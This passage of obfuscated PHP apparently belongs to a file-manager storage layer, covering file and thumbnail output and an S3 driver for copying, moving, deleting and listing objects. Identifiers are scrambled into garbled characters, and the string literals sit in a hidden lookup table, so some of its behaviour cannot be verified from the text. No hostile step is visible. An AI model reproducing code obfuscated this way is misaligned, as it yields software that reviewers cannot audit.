<= $ƒ†ŸæŠ) { $ƒ†ŸæŠ = $©£á¤„; } echo $this->fileSubstr($ììê¨Ú, $öûñ•«å, $ƒ†ŸæŠ); $öûñ•«å += $ƒ†ŸæŠ; if ($ƒ†ŸæŠ == $©£á¤„) { $öûñ•«å = $Õ‰‚ï + 1; } if ($ïÕ’•­») { $ñí¨İü‘ = intval(1000 * 1000 * (timeFloat() - $Ñ¿¾‚¨)); $¤ŒØö¤õ = $ïÕ’•­» - $ñí¨İü‘; if ($¤ŒØö¤õ > 5) { usleep($¤ŒØö¤õ); } } } } public function fileOutServer($©çÊ™ ½, $·§ò = false, $‰ê¤ßï = false, $ˆš¯²ö = '') { $this->fileOut($©çÊ™ ½, $·§ò, $‰ê¤ßï, $ˆš¯²ö); } public function fileOutLink($İÍÛ·“‰) { header($_SERVER[Ö†ØøÖ±][162] . $İÍÛ·“‰); die; } public function cacheMethod($òß¾ûœŸ, $ç‡Ó×åü, $Ë”ûÓá¼ = null) { $„¡º¸» =& $_SERVER[Ö†ØøÖ±]; static $ÁŠµóúº = array(); $Œ¶Ğ¸Àş = $ç‡Ó×åü ? ltrim($this->getPathOuter($ç‡Ó×åü), $„¡º¸»[8]) : $„¡º¸»[12]; $Ü„üµÒ = $„¡º¸»[163] . $òß¾ûœŸ . $„¡º¸»[164] . rtrim($Œ¶Ğ¸Àş, $„¡º¸»[8]); if (is_null($òß¾ûœŸ)) { $ÁŠµóúº = array(); return; } if (is_null($ç‡Ó×åü)) { foreach ($ÁŠµóúº as $Ü„üµÒ => $Ö×Êˆšõ) { if (!strstr($Ü„üµÒ, $„¡º¸»[163] . $òß¾ûœŸ . $„¡º¸»[165])) { continue; } unset($ÁŠµóúº[$Ü„üµÒ]); } return; } if (!is_null($Ë”ûÓá¼)) { $ÁŠµóúº[$Ü„üµÒ] = $Ë”ûÓá¼; return; } $áß©§Û = isset($ÁŠµóúº[$Ü„üµÒ]) ? $ÁŠµóúº[$Ü„üµÒ] : null; if (!is_null($áß©§Û)) { return $áß©§Û; } $áß©§Û = $this->{$òß¾ûœŸ}($ç‡Ó×åü); $ÁŠµóúº[$Ü„üµÒ] = $áß©§Û; return $áß©§Û; } public function cacheMethodInfoSet($¾ˆªì¼, $ó‰óîÍ¸, $«–×—¡š = false) { $¡¿ĞéÄ— =& $_SERVER[Ö†ØøÖ±]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($¡¿ĞéÄ—[166], $¾ˆªì¼, $ó‰óîÍ¸); $this->cacheMethod($¡¿ĞéÄ—[167], $¾ˆªì¼, $ó‰óîÍ¸ ? !1 : !0); if (is_array($«–×—¡š)) { $this->cacheMethod($¡¿ĞéÄ—[168], $¾ˆªì¼, $«–×—¡š); } } public function fileOutImage($³şÎ…áè, $ÑÂ­ëáˆ = 250) { $ê¢¼®ÂĞ =& $_SERVER[Ö†ØøÖ±]; set_timeout(); if (substr($³şÎ…áè, 0, 4) == $ê¢¼®ÂĞ[149]) { $this->fileOutLink($³şÎ…áè); } $˜»ÜÅä = $this->info($³şÎ…áè); $ˆıŸƒÒ = !1; $ª¶ˆŞ¼î = isset($GLOBALS[$ê¢¼®ÂĞ[169]]) ? $GLOBALS[$ê¢¼®ÂĞ[169]] : array(); if ($ª¶ˆŞ¼î && $ª¶ˆŞ¼î[$ê¢¼®ÂĞ[170]] == $˜»ÜÅä[$ê¢¼®ÂĞ[84]]) { $˜»ÜÅä = $ª¶ˆŞ¼î; $ºï˜×—Ñ = $˜»ÜÅä[$ê¢¼®ÂĞ[171]]; if ($ºï˜×—Ñ && isset($ºï˜×—Ñ[$ê¢¼®ÂĞ[172]])) { if ($ºï˜×—Ñ[$ê¢¼®ÂĞ[172]] <= $ÑÂ­ëáˆ && $ºï˜×—Ñ[$ê¢¼®ÂĞ[173]] <= $ÑÂ­ëáˆ) { $ˆıŸƒÒ = !0; } } } if ($˜»ÜÅä[$ê¢¼®ÂĞ[76]] <= 1024 * 50 || $ˆıŸƒÒ || !function_exists($ê¢¼®ÂĞ[174]) || $˜»ÜÅä[$ê¢¼®ÂĞ[175]] == $ê¢¼®ÂĞ[176]) { return $this->fileOut($³şÎ…áè, !1, $˜»ÜÅä[$ê¢¼®ÂĞ[32]]); } $ÂÄ©Áˆ› = kodIO::hashPath($˜»ÜÅä); $¿ªÔœÍØ = "\x63\157\x76\x65\162\x5f{$ÂÄ©Áˆ›}\137{$ÑÂ­ëáˆ}\x2e\x70\156\147"; $²Ìæ¬£ü = IO_PATH_SYSTEM_TEMP . $ê¢¼®ÂĞ[177]; $î®Œ§œ = IO::infoFullSimple($²Ìæ¬£ü); $†Ø¬¢ª€ = $î®Œ§œ && is_array($î®Œ§œ) ? $î®Œ§œ[$ê¢¼®ÂĞ[84]] : $ê¢¼®ÂĞ[12]; if (!$†Ø¬¢ª€) { $†Ø¬¢ª€ = IO::mkdir($²Ìæ¬£ü); } if ($˜»ÜÅä[$ê¢¼®ÂĞ[178]] == $ê¢¼®ÂĞ[179] && isset($˜»ÜÅä[$ê¢¼®ÂĞ[180]]) && $˜»ÜÅä[$ê¢¼®ÂĞ[180]] == kodIO::sourceID($†Ø¬¢ª€)) { $Ç¢£Èú– = $˜»ÜÅä[$ê¢¼®ÂĞ[181]]; if ($ÑÂ­ëáˆ <= 500) { $•Ô½„€¯ = preg_replace($ê¢¼®ÂĞ[182], $ê¢¼®ÂĞ[183], $˜»ÜÅä[$ê¢¼®ÂĞ[32]]); $Ç¢£Èú– = IO::fileNameExist($†Ø¬¢ª€, $•Ô½„€¯); } return IO::fileOut(KodIO::make($Ç¢£Èú–), !1, $˜»ÜÅä[$ê¢¼®ÂĞ[32]]); } $—òã¶ = IO::fileNameExist($†Ø¬¢ª€, $¿ªÔœÍØ); if ($—òã¶) { return IO::fileOut(KodIO::make($—òã¶), !1, $˜»ÜÅä[$ê¢¼®ÂĞ[32]]); } if ($ÑÂ­ëáˆ > 1000) { $this->makeImageCover($†Ø¬¢ª€, $³şÎ…áè, $¿ªÔœÍØ, $ÑÂ­ëáˆ); $this->makeImageCover($†Ø¬¢ª€, $³şÎ…áè, "\x63\157\x76\145\x72\137{$ÂÄ©Áˆ›}\137\x32\x35\x30\x2e\160\156\x67", 250); $—òã¶ = IO::fileNameExist($†Ø¬¢ª€, $¿ªÔœÍØ); if ($—òã¶) { return IO::fileOut(KodIO::make($—òã¶), !1, $˜»ÜÅä[$ê¢¼®ÂĞ[32]]); } die; } $àáÅñ…Ñ = Cache::get($¿ªÔœÍØ); if ($àáÅñ…Ñ == $ê¢¼®ÂĞ[184] || $àáÅñ…Ñ == $ê¢¼®ÂĞ[185]) { echo $àáÅñ…Ñ; die; } Cache::set($¿ªÔœÍØ, $ê¢¼®ÂĞ[185], 60); $‡ÃÁ¼Ğ† = array($†Ø¬¢ª€, $˜»ÜÅä[$ê¢¼®ÂĞ[84]], $¿ªÔœÍØ, $ÑÂ­ëáˆ); $™Ø÷¼ò = $ê¢¼®ÂĞ[186] . $˜»ÜÅä[$ê¢¼®ÂĞ[76]] . $ê¢¼®ÂĞ[187] . $¿ªÔœÍØ . $ê¢¼®ÂĞ[188] . $˜»ÜÅä[$ê¢¼®ÂĞ[32]] . $ê¢¼®ÂĞ[189] . $˜»ÜÅä[$ê¢¼®ÂĞ[84]]; TaskQueue::add($ê¢¼®ÂĞ[190], $‡ÃÁ¼Ğ†, $™Ø÷¼ò, $¿ªÔœÍØ); } public function makeImageCover($äøùöú, $†—ØÓñÜ, $ç¸½Òç¯, $¬ŸÒÑ·“) { $›ó†äéÎ =& $_SERVER[Ö†ØøÖ±]; if (IO::fileNameExist($äøùöú, $ç¸½Òç¯)) { return $›ó†äéÎ[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ë¬Ø¢Şˆ = DATA_THUMB . $ç¸½Òç¯; del_file($Ë¬Ø¢Şˆ); $×­†úÃ¢ = TEMP_FILES . $ç¸½Òç¯; if (!@file_exists($×­†úÃ¢)) { $×­†úÃ¢ = IO::download($†—ØÓñÜ, $×­†úÃ¢); } if (!@file_exists($×­†úÃ¢)) { return $›ó†äéÎ[192]; } ImageThumb::createThumb($×­†úÃ¢, $Ë¬Ø¢Şˆ, $¬ŸÒÑ·“, $¬ŸÒÑ·“ * 10); if (@file_exists($Ë¬Ø¢Şˆ)) { Cache::remove($ç¸½Òç¯); return IO::move($Ë¬Ø¢Şˆ, $äøùöú); } Cache::set($ç¸½Òç¯, $›ó†äéÎ[184], 600); del_file($Ë¬Ø¢Şˆ); return $›ó†äéÎ[193] . $×­†úÃ¢ . $›ó†äéÎ[71]; } public function fileOutImageServer($ÆêÚŸ°ü, $†±õÓó = 250) { $this->fileOutImage($ÆêÚŸ°ü, $†±õÓó); } public function fileNameAuto($ÇØä©ş„, $­İ‹‰Ê®, $ŞÔËåúõ = REPEAT_RENAME, $øÕÎÃ‡ = false) { $áóüûî =& $_SERVER[Ö†ØøÖ±]; $ŞêŒºÃ = $ÇØä©ş„ === $áóüûî[12] ? $­İ‹‰Ê® : rtrim($ÇØä©ş„, $áóüûî[8]) . $áóüûî[8] . $­İ‹‰Ê®; if ($ŞÔËåúõ == REPEAT_REPLACE || !$this->exist($ŞêŒºÃ) || $øÕÎÃ‡ && $ŞÔËåúõ != REPEAT_RENAME_FOLDER) { return $­İ‹‰Ê®; } if ($ŞÔËåúõ == REPEAT_SKIP) { return !1; } $Ò¹€ïşœ = $áóüûî[10] . get_path_ext($­İ‹‰Ê®); $Ò¹€ïşœ = $Ò¹€ïşœ == $áóüûî[10] || $øÕÎÃ‡ ? $áóüûî[12] : $Ò¹€ïşœ; $ÜºÍ€”Æ = 1; $Àö¾Ö×é = substr($­İ‹‰Ê®, 0, strlen($­İ‹‰Ê®) - strlen($Ò¹€ïşœ)); $¢ı§Âš = $Àö¾Ö×é . "\x28{$ÜºÍ€”Æ}\51{$Ò¹€ïşœ}"; while ($this->exist(rtrim($ÇØä©ş„, $áóüûî[8]) . $áóüûî[8] . $¢ı§Âš)) { $¢ı§Âš = $Àö¾Ö×é . "\x28{$ÜºÍ€”Æ}\51{$Ò¹€ïşœ}"; $ÜºÍ€”Æ++; } return $¢ı§Âš; } private function fileNameAutoList($†Ùˆ¬€™, $ƒ®çÇ­ò, $ßµ®ÌÅ = false) { $®‡“©åò =& $_SERVER[Ö†ØøÖ±]; $¡ò˜Î¿ = $this->listPath($†Ùˆ¬€™, !0); $¡ò˜Î¿ = array_merge($¡ò˜Î¿[$®‡“©åò[82]], $¡ò˜Î¿[$®‡“©åò[83]]); $ˆ¤Í´ıå = array_to_keyvalue($¡ò˜Î¿, $®‡“©åò[12], $®‡“©åò[32]); $º¤¥Ñ– = $®‡“©åò[10] . get_path_ext($ƒ®çÇ­ò); $º¤¥Ñ– = $º¤¥Ñ– == $®‡“©åò[10] || $ßµ®ÌÅ ? $®‡“©åò[12] : $º¤¥Ñ–; $Ğ³ä³ÚÕ = substr($ƒ®çÇ­ò, 0, strlen($ƒ®çÇ­ò) - strlen($º¤¥Ñ–)); $üÄëÀ¤ = $Ğ³ä³ÚÕ . "\50\x30\x29{$º¤¥Ñ–}"; for ($õÇŠÊ‡‚ = 1; $õÇŠÊ‡‚ <= count($ˆ¤Í´ıå) + 1; $õÇŠÊ‡‚++) { $üÄëÀ¤ = $Ğ³ä³ÚÕ . "\50{$õÇŠÊ‡‚}\x29{$º¤¥Ñ–}"; if (!in_array_not_case($üÄëÀ¤, $ˆ¤Í´ıå)) { return $üÄëÀ¤; } } return $üÄëÀ¤; } public function listAllFiles($—ï ¯‘ù, $µÂÇ”×) { $ª» ü´ =& $_SERVER[Ö†ØøÖ±]; if (empty($µÂÇ”×)) { return array(); } $ëÃ»ê°š = array_keys($µÂÇ”×); $¡®²ª«® = array(); $—ï ¯‘ù = trim($—ï ¯‘ù, $ª» ü´[8]); foreach ($µÂÇ”× as $Ûüğİüà => $èŸÄè‡) { $¼åúœ© = ltrim(substr(trim($Ûüğİüà, $ª» ü´[8]), strlen($—ï ¯‘ù)), $ª» ü´[8]); if (substr($Ûüğİüà, -1) == $ª» ü´[8]) { $¼åúœ© = rtrim($¼åúœ©, $ª» ü´[8]) . $ª» ü´[8]; } $¡®²ª«® = array_merge($¡®²ª«®, $this->slicePath($¼åúœ©)); } $¬©«ş… = array(); foreach (array_unique($¡®²ª«®) as $ß‡íÀÀê) { $¡¾˜Ú¥é = array($ª» ü´[84] => $this->getPathOuter($ª» ü´[8] . $—ï ¯‘ù . $ª» ü´[8] . $ß‡íÀÀê), $ª» ü´[75] => 1, $ª» ü´[76] => 0); if (substr($ß‡íÀÀê, -1) != $ª» ü´[8]) { $¡¾˜Ú¥é[$ª» ü´[75]] = 0; $«è¸“¢ = $this->getPath($—ï ¯‘ù . $ª» ü´[8] . $ß‡íÀÀê); if (isset($µÂÇ”×[$«è¸“¢])) { $êèÄø‰ = $µÂÇ”×[$«è¸“¢]; if (isset($êèÄø‰[$ª» ü´[76]])) { $¡¾˜Ú¥é[$ª» ü´[76]] = intval($êèÄø‰[$ª» ü´[76]]); } if (isset($êèÄø‰[$ª» ü´[194]])) { $¡¾˜Ú¥é[$ª» ü´[85]] = intval($êèÄø‰[$ª» ü´[194]]); } } } $¬©«ş…[] = $¡¾˜Ú¥é; } return $¬©«ş…; } public function slicePath($¨Ê€ì¹¬) { $ˆ¼İßª =& $_SERVER[Ö†ØøÖ±]; $³¥ÀÚì… = explode($ˆ¼İßª[8], trim($¨Ê€ì¹¬, $ˆ¼İßª[8])); $×­³†… = 0; do { ++$×­³†…; $úÉ îÂÄ[] = implode($ˆ¼İßª[8], array_slice($³¥ÀÚì…, 0, $×­³†…)) . $ˆ¼İßª[8]; } while ($×­³†… < count($³¥ÀÚì…)); $úÉ îÂÄ[count($³¥ÀÚì…) - 1] = $¨Ê€ì¹¬; return $úÉ îÂÄ; } public function getHost() { $»ÆåÓëÖ =& $_SERVER[Ö†ØøÖ±]; $³¿ùíÅä = parse_url(trim($this->domain, $»ÆåÓëÖ[8])); $Ğ÷²÷‚× = isset($³¿ùíÅä[$»ÆåÓëÖ[195]]) ? $³¿ùíÅä[$»ÆåÓëÖ[195]] : http_type(); $ß¯ı¤à = isset($³¿ùíÅä[$»ÆåÓëÖ[196]]) ? $³¿ùíÅä[$»ÆåÓëÖ[196]] : $³¿ùíÅä[$»ÆåÓëÖ[84]]; if (isset($³¿ùíÅä[$»ÆåÓëÖ[197]])) { $ß¯ı¤à .= $»ÆåÓëÖ[4] . $³¿ùíÅä[$»ÆåÓëÖ[197]]; } return $Ğ÷²÷‚× . $»ÆåÓëÖ[198] . $ß¯ı¤à; } public function pathEncode($°ÄÊ«³„) { $ò òîâğ =& $_SERVER[Ö†ØøÖ±]; return str_replace($ò òîâğ[199], $ò òîâğ[8], rawurlencode($°ÄÊ«³„)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¹Ïâãœ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ö†ØøÖ±][200]; parent::__construct(); $this->_init($¹Ïâãœ); } public function _init($ùÒì‡ğí) { $this->config = $ùÒì‡ğí; foreach ($ùÒì‡ğí as $£î˜ÌêŸ => $‡ûÔ·ç¶) { if (isset($this->{$£î˜ÌêŸ})) { $this->{$£î˜ÌêŸ} = $‡ûÔ·ç¶; } } $this->endpoint = $ùÒì‡ğí[$_SERVER[Ö†ØøÖ±][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($«ÕŠÎî™ = "\166\64") { $this->signVer = $«ÕŠÎî™; $this->client->setSignatureVersion($«ÕŠÎî™); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Ú½æüëÓ =& $_SERVER[Ö†ØøÖ±]; $ıª¼Ïœ = $this->getBucketCors(); if (!$ıª¼Ïœ || !is_array($ıª¼Ïœ)) { return !1; } if ($ıª¼Ïœ[$Ú½æüëÓ[202]] != $Ú½æüëÓ[203] || $ıª¼Ïœ[$Ú½æüëÓ[204]] != $Ú½æüëÓ[203]) { return !1; } $ª§„Ï½ = array_map($Ú½æüëÓ[205], $ıª¼Ïœ[$Ú½æüëÓ[206]]); if (!is_array($ª§„Ï½)) { $ª§„Ï½ = array(); } $øçÇ›ß— = array($Ú½æüëÓ[207], $Ú½æüëÓ[208], $Ú½æüëÓ[209], $Ú½æüëÓ[210], $Ú½æüëÓ[211]); $ê½ô»È½ = array_diff($øçÇ›ß—, $ª§„Ï½); return empty($ê½ô»È½); } public function mkfile($Å°æ‚–™, $ãü¯’¡ = '', $ˆÌë¬†” = REPEAT_RENAME) { $Ó÷Å‘Ÿ‘ = $this->setContent($Å°æ‚–™, $ãü¯’¡); if ($Ó÷Å‘Ÿ‘ !== !1) { return $this->getPathOuter($Å°æ‚–™); } return !1; } public function mkdir($÷«è³…, $¹–ãì = REPEAT_SKIP) { $¤œ·ÛÚä =& $_SERVER[Ö†ØøÖ±]; if (empty($÷«è³…) && $÷«è³… !== $¤œ·ÛÚä[212]) { return !1; } if ($¹–ãì && $this->_isFolder($÷«è³…)) { return $this->getPathOuter($÷«è³…); } $äâ²ºÆ† = $this->setContent($÷«è³…, $¤œ·ÛÚä[12], !0); if ($äâ²ºÆ† !== !1) { return $this->getPathOuter($÷«è³…); } return !1; } public function copyFile($“ñşÀ¤§, $«ş€ø”´, $²ëÆô¡Ú = array()) { $„û¶ıÑ =& $_SERVER[Ö†ØøÖ±]; $®ÓñÑò = $this->objectMeta($“ñşÀ¤§); if (!$®ÓñÑò) { return !1; } if ($®ÓñÑò[$„û¶ıÑ[76]] <= 1024 * 1024 * 200) { $é¸»Ÿ×Ë = $this->client->copyObject($this->bucket, $“ñşÀ¤§, $this->bucket, $«ş€ø”´, $„û¶ıÑ[213], $²ëÆô¡Ú); } else { $é¸»Ÿ×Ë = $this->client->multiCopyObject($this->bucket, $“ñşÀ¤§, $this->bucket, $«ş€ø”´, $²ëÆô¡Ú); } $é¸»Ÿ×Ë = $é¸»Ÿ×Ë ? $this->getPathOuter($«ş€ø”´) : !1; return $é¸»Ÿ×Ë; } public function moveFile($Üñ™ì»…, $Ï¡©™üı) { if ($this->copyFile($Üñ™ì»…, $Ï¡©™üı)) { $this->delFile($Üñ™ì»…); return $this->getPathOuter($Ï¡©™üı); } return !1; } public function delFile($æÓÚ·¶) { return $this->client->deleteObject($this->bucket, $æÓÚ·¶); } public function delFolder($‚à’”­) { $ïÇ÷×¹æ =& $_SERVER[Ö†ØøÖ±]; if (!$this->exist($‚à’”­)) { return !0; } $this->listItemCache = !1; $ÑÁÎÌ« = $this->fileList($‚à’”­); $this->listItemCache = !0; $ãÕÑŒ–õ = trim($‚à’”­, $ïÇ÷×¹æ[8]) . $ïÇ÷×¹æ[8]; if (!empty($‚à’”­) && $‚à’”­ !== $ïÇ÷×¹æ[212] && !in_array($ãÕÑŒ–õ, $ÑÁÎÌ«[$ïÇ÷×¹æ[82]])) { $ÑÁÎÌ«[$ïÇ÷×¹æ[82]][] = $ãÕÑŒ–õ; } $ ¬ÂØ‘˜ = $this->delByBatch($ÑÁÎÌ«[$ïÇ÷×¹æ[83]]); if (!$ ¬ÂØ‘˜) { return !1; } $ ¬ÂØ‘˜ = $this->delByBatch($ÑÁÎÌ«[$ïÇ÷×¹æ[82]]); if (!$ ¬ÂØ‘˜) { return !1; } return $this->delFile($ãÕÑŒ–õ); } private function delByBatch($ÉîçÁ´) { foreach (array_chunk($ÉîçÁ´, 1000) as $ç¤ºÊú») { $‹˜ˆÒÆÃ = $this->client->deleteObjects($this->bucket, $ç¤ºÊú»); if (!$‹˜ˆÒÆÃ) { return !1; } } return !0; } public function rename($Ã»“Ã«ª, $¸ï‹î½§) { return $this->renameObject($Ã»“Ã«ª, $¸ï‹î½§); } public function listPath($îö¥İÕÜ, $¶êÓ±¤ª = false) { $ò¦ÌË˜ =& $_SERVER[Ö†ØøÖ±]; $¾­½¶ñ = $this->fileList($îö¥İÕÜ, $ò¦ÌË˜[8], !0); foreach ($¾­½¶ñ[$ò¦ÌË˜[82]] as $åå¯­ÚŒ => $ö¯Ã²ıë) { $¾­½¶ñ[$ò¦ÌË˜[82]][$åå¯­ÚŒ] = $this->folderInfo($ö¯Ã²ıë, $¶êÓ±¤ª, $ö¯Ã²ıë); } foreach ($¾­½¶ñ[$ò¦ÌË˜[83]] as $åå¯­ÚŒ => $ö¯Ã²ıë) { $¾­½¶ñ[$ò¦ÌË˜[83]][$åå¯­ÚŒ] = $this->fileInfo($ö¯Ã²ıë[$ò¦ÌË˜[32]], $¶êÓ±¤ª, $ö¯Ã²ıë); } return $¾­½¶ñ; } protected function infoChildren($ËĞ¦§”€, &$®ÃòÀï‚) { $Ö“Ø =& $_SERVER[Ö†ØøÖ±]; $ÜÜÇÏèè = $this->fileList($ËĞ¦§”€, $Ö“Ø[12], !0); $®ÃòÀï‚[$Ö“Ø[78]] += count($ÜÜÇÏèè[$Ö“Ø[82]]); $®ÃòÀï‚[$Ö“Ø[77]] += count($ÜÜÇÏèè[$Ö“Ø[83]]); foreach ($ÜÜÇÏèè[$Ö“Ø[83]] as $ôæå¼ü‘) { if (!$ôæå¼ü‘ || !$ôæå¼ü‘[$Ö“Ø[76]]) { continue; } $®ÃòÀï‚[$Ö“Ø[76]] += $ôæå¼ü‘[$Ö“Ø[76]]; } } private function fileInfo($ãİºÌÓâ, $ÚıĞœ«Ç = false, $‘†ÛªçÇ = array()) { $¨‡õ¬Š =& $_SERVER[Ö†ØøÖ±]; $Í³ëÅàå = array($¨‡õ¬Š[32] => $this->pathThis($ãİºÌÓâ), $¨‡õ¬Š[84] => $this->getPathOuter($ãİºÌÓâ), $¨‡õ¬Š[33] => $¨‡õ¬Š[214], $¨‡õ¬Š[175] => $this->ext($ãİºÌÓâ), $¨‡õ¬Š[76] => isset($‘†ÛªçÇ[$¨‡õ¬Š[76]]) ? $‘†ÛªçÇ[$¨‡õ¬Š[76]] : 0); if ($ÚıĞœ«Ç) { return $Í³ëÅàå; } $Í³ëÅàå[$¨‡õ¬Š[215]] = $Í³ëÅàå[$¨‡õ¬Š[85]] = 0; $Í³ëÅàå[$¨‡õ¬Š[216]] = $Í³ëÅàå[$¨‡õ¬Š[217]] = !0; if (empty($‘†ÛªçÇ)) { $‘†ÛªçÇ = $this->objectMeta($ãİºÌÓâ); if (!$‘†ÛªçÇ) { return $Í³ëÅàå; } } if (isset($‘†ÛªçÇ[$¨‡õ¬Š[218]]) && $‘†ÛªçÇ[$¨‡õ¬Š[218]]) { $Í³ëÅàå[$¨‡õ¬Š[219]] = $‘†ÛªçÇ[$¨‡õ¬Š[218]]; } if (isset($‘†ÛªçÇ[$¨‡õ¬Š[194]])) { $Í³ëÅàå[$¨‡õ¬Š[85]] = $‘†ÛªçÇ[$¨‡õ¬Š[194]]; } if (isset($‘†ÛªçÇ[$¨‡õ¬Š[76]])) { $Í³ëÅàå[$¨‡õ¬Š[76]] = $‘†ÛªçÇ[$¨‡õ¬Š[76]]; } return $Í³ëÅàå; } private function folderInfo($ ‹Òõß˜, $êäß ›Ô = false, $ŸĞÆÈÌî = array()) { $¾Áüêà =& $_SERVER[Ö†ØøÖ±]; $í¡·ïÏ» = array($¾Áüêà[32] => $this->pathThis($ ‹Òõß˜), $¾Áüêà[84] => $this->getPathOuter($¾Áüêà[8] . $ ‹Òõß˜), $¾Áüêà[33] => $¾Áüêà[75]); if ($êäß ›Ô) { return $í¡·ïÏ»; } $í¡·ïÏ»[$¾Áüêà[215]] = $í¡·ïÏ»[$¾Áüêà[85]] = 0; $í¡·ïÏ»[$¾Áüêà[216]] = $í¡·ïÏ»[$¾Áüêà[217]] = !0; if ($ ‹Òõß˜ == $¾Áüêà[12]) { return $í¡·ïÏ»; } if (empty($ŸĞÆÈÌî)) { $ŸĞÆÈÌî = $this->objectMeta(trim($ ‹Òõß˜, $¾Áüêà[8]) . $¾Áüêà[8]); } if (isset($ŸĞÆÈÌî[$¾Áüêà[194]])) { $í¡·ïÏ»[$¾Áüêà[215]] = $ŸĞÆÈÌî[$¾Áüêà[194]]; } return $í¡·ïÏ»; } private function fileList($àçğÏº¥, $ºíÖöëÕ = '', $óŒıÚòœ = 0) { $Ûú©‰Üø =& $_SERVER[Ö†ØøÖ±]; $«ĞĞ•æÊ = rtrim($àçğÏº¥, $Ûú©‰Üø[8]) . $Ûú©‰Üø[8]; $õà˜ö²ê = $this->listObjs($«ĞĞ•æÊ, null, null, $ºíÖöëÕ); if (!$õà˜ö²ê) { return array($Ûú©‰Üø[82] => array(), $Ûú©‰Üø[83] => array()); } $®›º‡Êé = $ğ‡ÏÓî© = array(); foreach ($õà˜ö²ê[$Ûú©‰Üø[220]] as $Ê—Æƒë³) { $Êœ¥„…Æ = $Ê—Æƒë³[$Ûú©‰Üø[32]]; if ($Êœ¥„…Æ == $«ĞĞ•æÊ) { continue; } $ïÌØúîğ = isset($Ê—Æƒë³[$Ûú©‰Üø[76]]) ? $Ê—Æƒë³[$Ûú©‰Üø[76]] : 0; $Àí­øöÄ = $ïÌØúîğ == 0 && substr($Êœ¥„…Æ, strlen($Êœ¥„…Æ) - 1, 1) == $Ûú©‰Üø[8] ? !0 : !1; $this->cacheMethodInfoSet($Êœ¥„…Æ, $Àí­øöÄ, $Ê—Æƒë³); if ($Àí­øöÄ) { $®›º‡Êé[] = $Êœ¥„…Æ; continue; } $ğ‡ÏÓî©[] = $óŒıÚòœ ? $Ê—Æƒë³ : $Êœ¥„…Æ; } foreach ($õà˜ö²ê[$Ûú©‰Üø[221]] as $Ê—Æƒë³) { $®›º‡Êé[] = $Ê—Æƒë³[$Ûú©‰Üø[32]]; $this->cacheMethodInfoSet($Ê—Æƒë³[$Ûú©‰Üø[32]], !0); } $this->cacheMethodInfoSet($àçğÏº¥, !0); return array($Ûú©‰Üø[82] => $®›º‡Êé, $Ûú©‰Üø[83] => $ğ‡ÏÓî©); } private function listObjs($éœó‚«Ğ, $€ª¾©µ = null, $©‘çÂ´ß = null, $§ã‡¯¦ğ = null) { $ãÕŒ¥ì° =& $_SERVER[Ö†ØøÖ±]; $éœó‚«Ğ = trim($éœó‚«Ğ, $ãÕŒ¥ì°[8]); $€ÑŠèæé = empty($éœó‚«Ğ) && $éœó‚«Ğ !== $ãÕŒ¥ì°[212] ? $ãÕŒ¥ì°[12] : $éœó‚«Ğ . $ãÕŒ¥ì°[8]; return $this->client->getBucket($this->bucket, $€ÑŠèæé, $€ª¾©µ, $©‘çÂ´ß, $§ã‡¯¦ğ, !0); } public function has($â˜Û©Ö, $¥ãˆé»ã = false, $Ó‘ôºÙÅ = true) { $µıûÙƒˆ =& $_SERVER[Ö†ØøÖ±]; $â˜Û©Ö = trim($â˜Û©Ö, $µıûÙƒˆ[8]); $²Çƒ™ğŞ = empty($â˜Û©Ö) && $â˜Û©Ö !== $µıûÙƒˆ[212] ? $µıûÙƒˆ[12] : $â˜Û©Ö . $µıûÙƒˆ[8]; $ûú›å•÷ = null; $¸Ù€â = 500; $Œì»½œ§ = $µıûÙƒˆ[8]; $ı€ÛûĞ¬ = $÷áóú¡´ = array(); while (!0) { $šúŠ˜²» = $this->listObjs($â˜Û©Ö, $ûú›å•÷, $¸Ù€â, $Œì»½œ§); if (!$šúŠ˜²») { break; } $ûú›å•÷ = $šúŠ˜²»[$µıûÙƒˆ[222]]; $Õ˜«¦ó¤ = $šúŠ˜²»[$µıûÙƒˆ[220]]; $êÇ¡Ê‚” = $šúŠ˜²»[$µıûÙƒˆ[221]]; if (empty($Õ˜«¦ó¤) && empty($êÇ¡Ê‚”)) { break; } if (count($Õ˜«¦ó¤) == 1 && $Õ˜«¦ó¤[0][$µıûÙƒˆ[32]] == $²Çƒ™ğŞ) { break; } if ($¥ãˆé»ã) { if (count($Õ˜«¦ó¤)) { $Õ˜«¦ó¤ = array_column($Õ˜«¦ó¤, $µıûÙƒˆ[32]); $ı€ÛûĞ¬ = array_merge($ı€ÛûĞ¬, $Õ˜«¦ó¤); } if (count($êÇ¡Ê‚”)) { $êÇ¡Ê‚” = array_column($êÇ¡Ê‚”, $µıûÙƒˆ[32]); $÷áóú¡´ = array_merge($÷áóú¡´, $êÇ¡Ê‚”); } if ($ûú›å•÷ === null) { break; } continue; } if ($Ó‘ôºÙÅ) { if (!empty($Õ˜«¦ó¤)) { if (count($Õ˜«¦ó¤) > 1 || isset($Õ˜«¦ó¤[0][$µıûÙƒˆ[32]]) && $Õ˜«¦ó¤[0][$µıûÙƒˆ[32]] != $²Çƒ™ğŞ) { return !0; } } } else { if (!empty($êÇ¡Ê‚”)) { return !0; } } if ($ûú›å•÷ === null) { break; } } if ($¥ãˆé»ã) { $ı€ÛûĞ¬ = array_diff($ı€ÛûĞ¬, array($²Çƒ™ğŞ)); $ı€ÛûĞ¬ = count(array_unique($ı€ÛûĞ¬)); $÷áóú¡´ = count(array_unique($÷áóú¡´)); return array($µıûÙƒˆ[223] => $ı€ÛûĞ¬, $µıûÙƒˆ[224] => $÷áóú¡´); } return !1; } public function listAll($ì‹á»’Æ) { $–¼«©î„ =& $_SERVER[Ö†ØøÖ±]; $÷‰¤ßè  = $this->fileList($ì‹á»’Æ, $–¼«©î„[12], !0); $¡‘Şƒá = array_to_keyvalue($÷‰¤ßè [$–¼«©î„[83]], 